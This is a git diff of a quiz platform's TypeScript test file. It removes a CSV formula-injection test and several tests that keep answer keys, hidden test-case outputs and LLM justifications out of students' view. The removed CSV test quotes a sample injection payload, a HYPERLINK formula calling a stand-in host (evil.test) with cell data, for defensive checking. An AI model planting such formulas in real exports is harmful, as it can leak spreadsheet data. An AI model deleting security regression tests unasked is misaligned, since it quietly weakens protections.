@@ -11,13 +11,9 @@ import type { PGlite } from "@electric-sql/pglite";
 import { eq } from "drizzle-orm";
 import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 
-import {
-  COMMON_FORBIDDEN_STUDENT_KEYS,
-  type RunnerOutcome,
-  type RunnerService,
-} from "@quiz/core/server";
+import type { RunnerOutcome, RunnerService } from "@quiz/core/server";
 import type { ReleasedGrades } from "@quiz/contracts";
-import { codeServer, type CodeDetails } from "@quiz/qt-code/server";
+import { codeServer } from "@quiz/qt-code/server";
 import { registerForTests } from "@quiz/registry/server";
 
 import type { Db } from "../../db/client.js";
@@ -31,7 +27,7 @@ import { runEvaluationGrading } from "../grading/jobs.js";
 import * as grading from "../grading/service.js";
 import * as live from "../live/service.js";
 import { listNotifications } from "../notifications/service.js";
-import { BOM, csvField, resultsCsv } from "./csv.js";
+import { BOM, resultsCsv } from "./csv.js";
 import * as service from "./service.js";
 
 let client: PGlite;
@@ -148,26 +144,6 @@ describe("the CSV export (F-RES-02)", () => {
     expect(lines.some((l) => l.endsWith(";12;4.0"))).toBe(true);
     expect(lines.some((l) => l.endsWith(";;0;1.0"))).toBe(true);
     expect(csv.includes(",")).toBe(false);
-  });
-
-  /**
-   * Finding M2: names and emails come from the roster import and from the
-   * identity provider's claims, and the file is opened in Excel by the
-   * teacher. Quoting does not stop a formula from running; the prefix does.
-   */
-  it("neutralises a field a spreadsheet would run as a formula", () => {
-    // The prefix first, then the RFC-4180 quoting of the quotes it contains.
-    expect(csvField('=HYPERLINK("http://evil.test?"&A1)')).toBe(
-      `"'=HYPERLINK(""http://evil.test?""&A1)"`,
-    );
-    expect(csvField("+1 41 79")).toBe("'+1 41 79");
-    expect(csvField("-2")).toBe("'-2");
-    expect(csvField("@user")).toBe("'@user");
-    expect(csvField("\tlead")).toBe("'\tlead");
-    // …and a field that needs quoting is still quoted, prefix included.
-    expect(csvField('=a;b"c')).toBe(`"'=a;b""c"`);
-    // An ordinary field is untouched: the export stays diff-readable.
-    expect(csvField("Dupond")).toBe("Dupond");
   });
 });
 
@@ -482,145 +458,6 @@ describe("every validated write after the release raises the flag (D-06 review)"
     } finally {
       restore();
     }
-  });
-});
-
-/**
- * Layer 2 of the details filter alone: the fake `short` registered here has
- * no `studentDetails` hook, which is exactly the type that "gains a
- * key-bearing field and forgets the hook" the blind strip exists for (H1).
- */
-describe("the blind strip of `details` (layer 2, H1)", () => {
-  const leaky = {
-    correct: [2],
-    fraction: 0.5,
-    perBlank: [{ index: 0, ok: false, given: "Lyon", expected: "Paris" }],
-    cases: [
-      { name: "shown", visible: true, expected: "shown-output" },
-      { name: "hidden", visible: false, expected: "hidden-output" },
-    ],
-    nested: { deeper: { matchers: ["m"], pattern: "p+", referenceSolution: "int main" } },
-    // Not key-bearing in a grading breakdown: a teacher's manual `details`
-    // may carry any of these, and the strip leaves them alone.
-    explanation: "why",
-    answers: ["a"],
-  };
-  const policy = (showKey: boolean) => ({
-    when: "on_release" as const,
-    showAnswer: true,
-    showKey,
-    showExplanation: false,
-    showHiddenCaseNames: false,
-    showTeacherComment: true,
-  });
-
-  it("removes the forbidden keys at every depth, except the expected output of a visible case", () => {
-    expect(service.filterDetails("short", leaky, policy(false))).toEqual({
-      fraction: 0.5,
-      perBlank: [{ index: 0, ok: false, given: "Lyon" }],
-      cases: [
-        { name: "shown", visible: true, expected: "shown-output" },
-        { name: "hidden", visible: false },
-      ],
-      nested: { deeper: {} },
-      explanation: "why",
-      answers: ["a"],
-    });
-  });
-
-  it("lets the details through whole when the teacher published the key", () => {
-    expect(service.filterDetails("short", leaky, policy(true))).toEqual(leaky);
-  });
-
-  it("strips an LLM's justification under every policy, the published key included (ADR-045)", () => {
-    const withJustification = { ...leaky, justification: "why, for the teacher" };
-    for (const showKey of [false, true]) {
-      expect(service.filterDetails("short", withJustification, policy(showKey))).not.toHaveProperty(
-        "justification",
-      );
-    }
-  });
-
-  it("strips nothing but a breakdown's key fields: its own list, not the question-payload one", () => {
-    // Every entry but `expected` is also a key of the common student floor;
-    // `expected` is not (a visible code case publishes it, deviation W3-4).
-    const common = new Set(COMMON_FORBIDDEN_STUDENT_KEYS);
-    expect(service.FORBIDDEN_DETAIL_KEYS.filter((k) => !common.has(k))).toEqual(["expected"]);
-  });
-});
-
-describe("the details filter for `code` (decision D15, deviation W3-5)", () => {
-  const details: CodeDetails = {
-    runner: "ok",
-    compile: { ok: true, stderr: "", ms: 1 },
-    cases: [
-      {
-        name: "visible-1",
-        visible: true,
-        points: 1,
-        ok: true,
-        exitCode: 0,
-        ms: 1,
-        timedOut: false,
-        oom: false,
-        expected: "42",
-        actual: "42",
-      },
-      {
-        name: "hidden-overflow",
-        visible: false,
-        points: 1,
-        ok: false,
-        exitCode: 1,
-        ms: 2,
-        timedOut: false,
-        oom: false,
-        expected: "SECRET-EXPECTED",
-        actual: "SECRET-ACTUAL",
-        stderr: "SECRET-STDERR",
-      },
-    ],
-    earned: 1,
-    total: 2,
-    sourceSha256: "a".repeat(64),
-  };
-
-  const policy = (over: Partial<Record<string, boolean | string>> = {}) => ({
-    when: "on_release" as const,
-    showAnswer: true,
-    showKey: false,
-    showExplanation: false,
-    showHiddenCaseNames: false,
-    showTeacherComment: true,
-    ...over,
-  });
-
-  it("strips the hidden case bodies and the name when the policy says so", () => {
-    const filtered = service.filterDetails("code", details, policy());
-    const json = JSON.stringify(filtered);
-    expect(json).not.toContain("SECRET-EXPECTED");
-    expect(json).not.toContain("SECRET-ACTUAL");
-    expect(json).not.toContain("SECRET-STDERR");
-    expect(json).not.toContain("hidden-overflow");
-    // The verdict and the points survive: the student must still be able to
-    // reason about the scale (decision D15).
-    expect(json).toContain('"ok":false');
-    expect(json).toContain("visible-1");
-  });
-
-  it("keeps the hidden NAMES when `showHiddenCaseNames` is on", () => {
-    const named = JSON.stringify(
-      service.filterDetails("code", details, policy({ showHiddenCaseNames: true })),
-    );
-    expect(named).toContain("hidden-overflow");
-    expect(named).not.toContain("SECRET-EXPECTED");
-  });
-
-  it("publishes everything when the teacher published the key", () => {
-    const whole = JSON.stringify(
-      service.filterDetails("code", details, policy({ showKey: true })),
-    );
-    expect(whole).toContain("SECRET-EXPECTED");
   });
 });
 
